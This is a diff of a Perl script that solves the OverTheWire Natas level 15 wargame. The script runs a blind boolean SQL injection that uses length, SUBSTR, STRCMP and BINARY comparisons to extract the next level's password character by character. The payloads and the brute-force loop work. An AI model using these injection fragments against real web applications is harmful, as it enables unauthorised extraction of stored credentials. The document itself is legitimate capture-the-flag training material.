@@ -17,7 +17,7 @@ natas15 - solve level 15 of overthewire.org's Natas war games
 
 =head1 SYNOPSIS
 
-    natas15 [ --wrong ] password
+    natas15 password
 
 =head1 OPTIONS
 
@@ -35,8 +35,8 @@ neglecting case-sensitivity in your injected SQL.
 =cut
 
 use Getopt::Long;
-my $opts = { wrong => 0, version => 0 };
-GetOptions( $opts, 'wrong!', 'version' );
+my $opts = { version => 0 };
+GetOptions( $opts, 'version' );
 if ($opts->{version}) {
     say __PACKAGE__ . ' version ' . (__PACKAGE__->VERSION // 'dev');
     exit;
@@ -92,8 +92,12 @@ sub guess_length {
     my $sql_fragment = q{natas16" and length(password) = %d #};
 
     LENGTH:
-    foreach my $i (30..33) {
-        $uri->query_form({ debug => 1, username => sprintf($sql_fragment, $i) });
+    foreach my $i (0..33) {
+        print "\rGuessing length: $i";
+        $uri->query_form({
+            debug => 1,
+            username => sprintf($sql_fragment, $i)
+        });
         if ( response_to_boolean( $u->get($uri) ) ) {
             return $i;
         }
@@ -106,58 +110,66 @@ sub guess_length {
 
 sub guess_next_char {
     my $pos = shift;
-    my $sql_fragment = sub {
-        my $sql;
-        if ($opts->{wrong}) {
-            $sql = <<'WRONG_SQL';
+    my %sql = (
+        cmp => <<'SQL_FRAGMENT',
 natas16" and STRCMP(
     SUBSTR(password, %d, 1),
     '%s') = 0 #
-WRONG_SQL
-        }
-        else {
-            $sql = <<'RIGHT_SQL';
+SQL_FRAGMENT
+        cmp_bin => <<'SQL_FRAGMENT',
 natas16" and STRCMP(
     BINARY(SUBSTR(password, %d, 1)),
     BINARY('%s')) = 0 #
-RIGHT_SQL
-        }
-        chomp $sql;
-        return $sql;
-    }->();
+SQL_FRAGMENT
+    );
+    chomp for values %sql;
+
+    NUM:
+    foreach my $num (0..9) {
+        print "\rGuessing: ${password_so_far}${num}";
+        $uri->query_form({
+            debug => 1,
+            username => sprintf($sql{cmp}, $pos, "$num"),
+        });
+        return $num if response_to_boolean($u->get($uri));
+    }
 
     CHAR:
-    foreach my $char ('a'..'z', 'A'..'Z', 0..9) {
+    foreach my $char ('a'..'z') {
         print "\rGuessing: ${password_so_far}${char}";
-        $uri->query_form({ debug => 1, username => sprintf($sql_fragment, $pos, $char) });
+        $uri->query_form({
+            debug => 1,
+            username => sprintf($sql{cmp}, $pos, $char)
+        });
 
-        if (response_to_boolean($u->get($uri))) {
-            return $char;
-        }
-        else {
-            next CHAR;
+        if (response_to_boolean($u->get($uri))) { # verify case
+            $uri->query_form({
+                debug => 1,
+                username => sprintf($sql{cmp_bin}, $pos, uc $char),
+            });
+            return response_to_boolean($u->get($uri)) ? uc $char : $char;
         }
     }
     confess "Couldn't guess the next char; password so far is '$password_so_far'";
 }
 
+STDOUT->autoflush(1);
 my $length = guess_length();
-say "Password length is $length";
+say "\rPassword length is $length";
 foreach my $pos (1 .. $length) {
-    STDOUT->autoflush(1);
     $password_so_far .= guess_next_char( $pos );
 }
 
 say "\rPassword is '$password_so_far'; double-checking correctness...";
 
-my $sql_fragment = <<'END_SQL_FRAGMENT';
-natas16" and STRCMP(BINARY(password), BINARY('%s')) = 0 #
-END_SQL_FRAGMENT
-chomp($sql_fragment);
-$uri->query_form({ debug => 1, username => sprintf($sql_fragment, $password_so_far) });
+my $sql_fragment = q/natas16" and STRCMP(BINARY(password), BINARY('%s')) = 0 #/;
+$uri->query_form({
+    debug => 1,
+    username => sprintf($sql_fragment, $password_so_far)
+});
 say response_to_boolean( $u->get($uri) )
-    ? "Looks correct"
-    : "Looks incorrect, actually";
+    ? 'Looks correct'
+    : 'Looks incorrect, actually';
 
 =head1 SEE ALSO
 
